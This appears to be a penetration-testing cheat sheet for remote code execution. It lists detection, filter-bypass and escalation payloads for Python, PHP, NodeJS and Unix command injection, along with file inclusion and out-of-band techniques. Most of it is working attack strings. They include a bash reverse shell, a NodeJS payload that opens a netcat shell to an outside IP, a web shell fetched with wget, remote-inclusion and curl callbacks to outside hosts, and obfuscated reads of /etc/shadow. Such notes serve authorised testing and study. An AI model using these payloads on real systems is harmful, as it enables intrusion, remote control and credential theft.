# Detection
- Send a `'` to check if there is an error. Then Fuzz input (based on previos error) to check difference in returning error.
  ```bash
  ');#
  '));#
  ')));#
  '))));#
  ...
  ```
- Python
  ```python
  print("RCE test!")
  "__import__('os').system('ls')"
  "__import__('os').system('sleep 10')"
  GET /calculator?calc="__import__('os').system('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')"
  eval('__import__(\'os\').popen(\'cat+flag\').read()')
  ```
- PHP
  ```bash
  phpinfo();
  <?php system("ls");?>
  <?php system("sleep 10");?>
  ".phpinfo();//
  '.phpinfo();//
  );}system('ls');//
  '));+phpinfo();//
  '));system('id');#
  ');print(file_get_content('index.php'));#
  ${`cat /etc/passwd`}
  ```
- NodeJS
  ```javascript
  {"activity":"sleep'+(global.process.mainModule.require('child_process').execSync('nc 49.13.57.86 8080 -e sh'))+'","health":"63","weight":"42","happiness":"56"}
  ```
- Unix
  ```bash
  ;ls;
  | sleep 10;
  & sleep 10;
  ` sleep 10;`
  $(sleep 10)
  ```

- **File inclusion:** Try to make the endpoint include either a remote file or a local file that you can control. 
  ```bash
  # Remote
  http://example.com/?page=http://attacker.com/malicious.php   
  http://example.com/?page=http:attacker.com/malicious.php

  # Local
  http://example.com/?page=../uploads/malicious.php            
  http://example.com/?page=..%2fuploads%2fmalicious.php
  ```

# Bypass
- Unix system
  ```bash
  # cat /etc/shadow
  cat "/e"tc'/shadow'     # quotes and double quotes
  cat /etc/sh*dow         # wildcards
  cat /etc/sha``dow
  cat /etc/sha$()dow      # empty command substitution
  cat /etc/sha${}dow
  ```
- PHP
  ```php
  # system('cat /etc/shadow');
  ('sys'.'tem')('cat /etc/shadow');    # concatenate
  system/**/('ls');                    # blank comment
  '\x73\x79\x73\x74\x65\x6d'('ls');    # hex-encoded
  ```
- Python
  ```python
  # __import__('os').system('cat /etc/shadow')
  __import__('o'+'s').system('cat /etc/shadow')
  __import__('\x6f\x73').system('cat /etc/shadow')
  ```
- `system` is filtered  →  Parameter Pollution (Webserver concatenate for parameter with same name)
  ```bash
  GET /calculator?calc="__import__('os').sy"&calc="stem('ls')"
  Host: example.com
  ```
- hex-encode
- URL-encode
- Double-URL-encode
- Vary the cases (uppercase or lowercase characters)
- Insert special characters such as
  - null bytes
  - newline characters
  - escape characters (`\`)
  - other special or non-ASCII characters 

# Escalate
- Classic RCEs
  - Create a proof of concept that executes a harmless command like whoami or ls.
  - Read a common system file such as `/etc/passwd`.
  - Create a file with a distinct filename on the system, such as `touch rce_by_YOUR_NAME.txt`.
- blind RCEs
  - Create a POC that executes the sleep command.
- Shell upload
  ```bash
  1.php?ev=<?php system('wget http://192.168.1.16/wp.txt') ?>
  1.php?ev=<?php system('mv wp.txt wp.php') ?>
  ```

# Commix
```bash
python3 commix.py -r [requestFile] -p [parameter]
```

# Tip
- Use BurpSuite active scanner.
- Only use out-of-band with these payloads:
  - PHP
      ```php
      {${sleep(10)}}           
      ${eval(file_get_contents('https://r.icollab.info'))}
      ```
  - General
      ```
      %0a`curl${IFS}https://r.icollab.info`
      %0a`{curl,https://r.icollab.info}`
      %0acurl%20https://r.icollab.info
      ```
